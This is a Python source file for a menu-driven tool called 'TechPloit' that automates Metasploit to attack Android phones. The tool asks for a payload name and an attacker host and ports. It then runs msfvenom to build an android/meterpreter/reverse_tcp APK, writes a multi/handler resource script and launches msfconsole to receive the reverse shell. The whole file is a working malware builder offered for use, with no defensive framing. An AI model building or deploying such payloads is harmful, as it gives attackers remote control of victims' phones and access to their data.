import os
from os import system
from time import sleep
from style.banner import *


RC, GC, YC, CC, DF = '\033[1;31m', '\033[1;32m', '\033[1;33m', '\033[1;36m', '\033[1;37m'

def MainMenu():
	system('clear')
	banner()
	print(f"  {GC}[{DF}+{GC}] {RC}Main MeNu{DF}\n")
	print(f"  {GC}[{DF}1{GC}] {YC} Android {DF}")
	print(f"  {GC}[{DF}0{GC}] {RC} EXIT {DF}\n")
	
	MM = input(f"{GC}>>>{YC}({RC}@TechPloit{YC}){GC}>>>{DF} ")
	if MM == "1":
		AndroidMenu()
	elif MM == "0":
		system('clear')
		exit()
	else:
		print(f"  {GC}[{DF}+{GC}] {YC}Please Choose A Valid Option{DF}")
		sleep(2)
		system('clear')
		print(f"  {YC} Thank You For Using Techploit{DF}")
		MainMenu()
	
def AndroidMenu():
	banner()
	print(f"  {GC}[{DF}+{GC}] {RC}Choose Android Payload {DF}\n")
	print(f"  {GC}[{DF}1{GC}] {YC}Payload APK{DF}")
	print(f"  {GC}[{DF}9{GC}] {YC}BACK{DF}")
	print(f"  {GC}[{DF}0{GC}] {RC}EXIT{DF}")
	AM = input(f"{GC}>>>{YC}({RC}@TechPloit{YC}){GC}>>>{DF} ")
	if AM == '1':
		print(f"  {RC}You Choosing Create A Payload Apk For Android {DF}")
		sleep(4)
		system('clear')
		banner()
		AM1 = input(f"  {GC}[{DF}+{GC}] {RC}Can You Use Local Network....{GC}[{DF}y/n{GC}]{CC}:{DF} ")
		if AM1 == 'n':
			AM1N = input(f"  {YC}Enter Your Payload Name:{DF} ")
			print(f" {CC}Your Payload Name is {AM1N}.apk{DF}")
			AM1H = input(f"  {YC}Enter Your Global IP or HOST:{DF}")
			print(f" {CC}Your Global HOST is {AM1H}{DF}")
			AM1GP = input(f"  {YC}Enter Your Global PORT:{DF} ")
			print(f" {CC}Your Global Port Is {AM1GP}{DF}")
			AM1P = input(f"  {YC} Enter Your Local PORT:{DF} ")
			print(f" {CC}Your Local PORT is {AM1P}{DF}")
		elif AM1 == 'y':
			AM1N = input(f"  {YC}Enter Your Payload Name:{DF} ")
			print(f" {CC}Your Payload Name is {AM1N}.apk{DF}")
			AM1H = input(f"  {YC}Enter Your Global IP or HOST:{DF}")
			print(f" {CC}Your Global HOST is {AM1H}{DF}")
			AM1P = input(f"  {YC} Enter Your Local PORT:{DF} ")
			AM1GP = AM1P
			print(f" {CC}Your Local PORT is {AM1P}{DF}")
		else:
			print(f"  {RC}Enter A Valid Option.......!")
		os.system(f'msfvenom -p android/meterpreter/reverse_tcp LHOST={AM1H} LPORT={AM1GP} R > /storage/emulated/0/{AM1N}.apk')
		PayloadApk = open("payloadapk.rc", "w")
		PayloadApk.write(f"use exploit/multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost {AM1H}\nset lport {AM1P}\nexploit")
		PayloadApk.close()
		os.system("msfconsole -r payloadapk.rc")
	if AM == '9':
		MainMenu()
	if AM == '0':
		system('clear')
		print(f"  {YC} Thank You For Using Techploit{DF}")
		exit()
	else:
		print(f"  {GC}[{DF}+{GC}] {YC}Please Choose A Valid Option{DF}")
		sleep(3)
		system('clear')
